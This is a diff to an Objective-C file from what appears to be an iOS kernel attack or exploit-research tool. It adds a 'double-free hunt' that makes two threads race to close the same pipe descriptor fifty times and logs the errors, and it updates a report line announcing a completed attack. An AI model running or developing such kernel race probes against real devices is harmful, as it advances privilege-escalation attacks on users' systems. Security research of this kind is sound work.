@@ -3188,7 +3188,35 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3]/[BOOT] выше\n"];
+    // ---- PIPE RACE 2.0.102: double-free hunt ----
+    {
+        __block volatile int go = 0;
+        __block volatile int errA = 0, errB = 0;
+        for (int round = 0; round < 50; round++) {
+            int *fds = malloc(sizeof(int) * 2);
+            if (pipe(fds) != 0) { free(fds); continue; }
+            go = 0;
+            int target = fds[0];
+            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                while (!go) {}
+                int e = close(target);
+                if (e != 0) errA++;
+            });
+            dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+                while (!go) {}
+                int e = close(target);
+                if (e != 0) errB++;
+            });
+            usleep(100);
+            go = 1;
+            usleep(2000);
+            close(fds[1]);
+            free(fds);
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [PIPE] 50 rounds, errA=%d errB=%d", errA, errB]);
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3]/[BOOT]/[PIPE] выше\n"];
     return r;
 
 }
